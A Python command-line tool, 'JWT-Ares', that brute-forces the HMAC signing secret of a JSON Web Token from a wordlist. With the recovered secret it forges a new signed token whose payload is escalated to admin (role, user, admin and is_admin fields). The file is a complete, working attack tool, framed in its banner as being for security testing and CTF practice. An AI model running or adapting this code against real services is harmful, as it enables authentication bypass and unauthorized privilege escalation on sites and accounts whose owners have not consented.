#!/usr/bin/env python3

import sys
import hmac
import hashlib
import base64
import json
import time
from typing import Optional
from tqdm import tqdm
from colorama import Fore, Style

GREEN = Fore.GREEN
RED = Fore.RED
LIGHT_RED = Fore.LIGHTRED_EX
NORMAL = Fore.RESET

BOLD = Style.BRIGHT
NORMAL_STYLE = Style.RESET_ALL


class JWTAres:
    def __init__(self, jwt_token: str):
        self.jwt_token = jwt_token
        self.header = None
        self.payload = None
        self.signature = None
        self.parse_jwt()
    
    def parse_jwt(self) -> None:
        """Parse the JWT token into its components"""
        try:
            parts = self.jwt_token.split('.')
            if len(parts) != 3:
                raise ValueError("Invalid JWT format")
            
            # Decode header
            header_data = self.base64url_decode(parts[0])
            self.header = json.loads(header_data)
            
            # Decode payload
            payload_data = self.base64url_decode(parts[1])
            self.payload = json.loads(payload_data)
            
            # Store signature
            self.signature = parts[2]
            
            print(f"🔐 Algorithm        : {self.header.get('alg', 'unknown')}")
            print(f"🔑 Token Type       : {self.header.get('typ', 'unknown')}")
            print(f"🚩 Payload          : {json.dumps(self.payload)}")
            
        except Exception as e:
            print(f"[-] Error parsing JWT: {e}")
            sys.exit(1)
    
    def base64url_decode(self, data: str) -> bytes:
        """Decode base64url encoded data"""
        # Add padding if needed
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        
        return base64.urlsafe_b64decode(data)
    
    def base64url_encode(self, data: bytes) -> str:
        """Encode data to base64url format"""
        return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')
    
    def create_signature(self, secret: str) -> str:
        """Create HMAC signature for JWT"""
        algorithm = self.header.get('alg', 'HS256')
        
        # recreate the signing input
        header_b64 = self.jwt_token.split('.')[0]
        payload_b64 = self.jwt_token.split('.')[1]
        signing_input = f"{header_b64}.{payload_b64}"
        
        if algorithm == 'HS256':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha256
            ).digest()
        elif algorithm == 'HS384':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha384
            ).digest()
        elif algorithm == 'HS512':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha512
            ).digest()
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")
        
        return self.base64url_encode(signature)
    
    def verify_secret(self, secret: str) -> bool:
        """Verify if the secret is correct"""
        try:
            calculated_signature = self.create_signature(secret)
            return calculated_signature == self.signature
        except Exception:
            return False
    
    def brute_force(self, wordlist_file: str) -> Optional[str]:
        """Brute force the JWT secret using wordlist"""
        print(f"📜 Wordlist         : {wordlist_file}")
        print(f"🎯 Target signature : {self.signature}")
        print("-" * 65)
        
        start_time = time.time()
        
        try:
            # Count total lines for progress bar
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                total_lines = sum(1 for line in f if line.strip())
            
            # Perform brute force with progress bar
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                with tqdm(total=total_lines, desc="Progress", unit=" attempts", 
                         bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]") as pbar:
                    
                    for line in f:
                        secret = line.strip()
                        if not secret:
                            continue
                        
                        pbar.update(1)
                        
                        if self.verify_secret(secret):
                            elapsed = time.time() - start_time
                            pbar.close()
                            print(GREEN + BOLD + f"\n[+] SECRET FOUND! ({secret})" + NORMAL + NORMAL_STYLE)
                            print(f"[+] Attempts: {pbar.n}")
                            print(f"[+] Time taken: {elapsed:.2f} seconds")
                            print(f"[+] Rate: {pbar.n/elapsed:.0f} attempts/sec")
                            print("-" * 65)
                            return secret
                            
        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {wordlist_file}")
            return None
        except Exception as e:
            print(f"[-] Error during brute force: {e}")
            return None
        
        elapsed = time.time() - start_time
        print(f"\n[-] Secret not found after {total_lines} attempts in {elapsed:.2f} seconds")
        return None
    
    def forge_token(self, secret: str, new_payload: dict = None) -> str:
        """Forge a new JWT token with the discovered secret"""
        if new_payload is None:
            # Use existing payload but modify some common fields for demonstration
            new_payload = self.payload.copy()
            
            # Common modifications for CTF scenarios
            if 'role' in new_payload:
                new_payload['role'] = 'admin'
            if 'user' in new_payload:
                new_payload['user'] = 'admin'
            if 'admin' in new_payload:
                new_payload['admin'] = True
            if 'is_admin' in new_payload:
                new_payload['is_admin'] = True
        
        # Create new token components
        header_b64 = self.base64url_encode(json.dumps(self.header, separators=(',', ':')).encode())
        payload_b64 = self.base64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
        
        # Create signature
        signing_input = f"{header_b64}.{payload_b64}"
        algorithm = self.header.get('alg', 'HS256')
        
        if algorithm == 'HS256':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha256
            ).digest()
        elif algorithm == 'HS384':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha384
            ).digest()
        elif algorithm == 'HS512':
            signature = hmac.new(
                secret.encode('utf-8'),
                signing_input.encode('utf-8'),
                hashlib.sha512
            ).digest()
        
        signature_b64 = self.base64url_encode(signature)
        new_token = f"{header_b64}.{payload_b64}.{signature_b64}"  # construct the new token
        
        print(f"[+] New token forged successfully!")
        print(f"[+] Modified payload: {json.dumps(new_payload)}")
        print(GREEN + BOLD + f"[+] New JWT token:" + NORMAL + NORMAL_STYLE)
        print(GREEN + BOLD + f"    {new_token}" + NORMAL + NORMAL_STYLE)
        
        return new_token


def print_banner():
    ascii_art = f'''{RED}
                   ───────█▄▄▄▄▄███▀▄─▄▄
             ───────────▄▀──▀▄─▀▀█▀▀▄▀──▀▄
                 ───────▀▄▀▀█▀▀████─▀▄──▄▀
    ──────────────────────▀▀──────────▀▀───────────────────────────────
{NORMAL_STYLE}'''
    print(f"""
    
         ___        _______      _                  
        | \\ \\      / /_   _|    / \\   _ __ ___  ___  
     _  | |\\ \\ /\\ / /  | |     / _ \\ | '__/ _ \\/ __| 
    | |_| | \\ V  V /   | |    / ___ \\| | |  __/\\__ \\
     \\___/   \\_/\\_/    |_|   /_/   \\_\\_|  \\___||___/  version 1.0.0
    {ascii_art}
   A high-performance JWT brute force tool designed for security testing
                Developed by {LIGHT_RED}{BOLD}S{NORMAL_STYLE}aher {LIGHT_RED}{BOLD}M{NORMAL_STYLE}ohamed 14/07/2025
            GitHub: https://github.com/SaherMuhamed/JWT-Ares   
    """)

def main():
    if len(sys.argv) != 3:
        print("Usage: python jwt_ares.py <JWT_TOKEN> <WORDLIST_FILE>")  # print usage if positional args didn't passed successfully
        sys.exit(1)
    
    jwt_token = sys.argv[1]
    wordlist_file = sys.argv[2]
    
    print_banner()  # print banner
    
    brute_forcer = JWTAres(jwt_token)  # create an object from JWTAres class
    secret = brute_forcer.brute_force(wordlist_file)  # attempt to brute force the secret
    
    if secret:
        # Verify the secret works
        if brute_forcer.verify_secret(secret):
            forged_token = brute_forcer.forge_token(secret)  # forge a new token
        else:
            print(f"[-] Secret verification: FAILED")
    else:
        print(f"[-] Brute force attack unsuccessful")


if __name__ == "__main__":
    main()
    